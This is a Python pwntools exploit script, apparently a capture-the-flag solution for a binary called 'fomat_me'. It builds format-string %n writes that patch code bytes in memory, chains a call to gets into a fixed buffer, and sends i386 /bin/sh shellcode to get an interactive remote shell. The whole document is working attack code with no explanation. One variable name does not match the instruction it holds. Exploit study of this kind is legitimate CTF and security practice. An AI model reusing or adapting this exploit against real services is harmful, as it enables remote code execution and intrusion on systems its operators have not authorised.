#!/usr/bin/env python
import sys, os
from pwn import *

HOST, PORT = (sys.argv[1], sys.argv[2]) if len(sys.argv) > 2 else ('localhost', 5566)
elf = ELF('fomat_me'); context.word_size = elf.elfclass
with context.local(log_level='ERROR'):
    libc = ELF('libc.so.6') if os.path.exists('libc.so.6') else elf.libc
if not libc: log.warning('Cannot open libc.so.6')

def fmtchar(prev_word, word, index, byte = 1):
    fmt = ''
    if word - prev_word > 0 :
        result = word - prev_word
        fmt += '%' + str(result) + 'c'
    elif word == prev_word :
        result = 0
    else :
        result = 256**byte - prev_word + word
        fmt += '%' + str(result) + 'c'
    if byte == 2 :
        fmt += '%' + str(index) + '$hn'
    elif byte == 4 :
        fmt += '%' + str(index) + '$n'
    else :
        fmt += '%' + str(index) + '$hhn'
    return fmt

r = remote(HOST, PORT)
pause()

buf = p32(0x08048000)
add_esp_0x10 = map(u8, list(asm('add esp, 0x68')))
addrs = flat(0x0804859c, 0x80485a6, 0x80485a7, 0x80485a8, 0x80485a9)
exp = flat(
    addrs,
    fmtchar(len(addrs),  0xeb, 7),
    fmtchar(0xeb,            add_esp_0x10[0], 8),
    fmtchar(add_esp_0x10[0], add_esp_0x10[1], 9),
    fmtchar(add_esp_0x10[1], add_esp_0x10[2], 10),
    fmtchar(add_esp_0x10[2],            0x90, 11),
    'a'*0x11, elf.sym['gets'], buf, buf
)
r.sendline(exp)
r.sendline(asm(shellcraft.i386.sh()))

r.interactive()
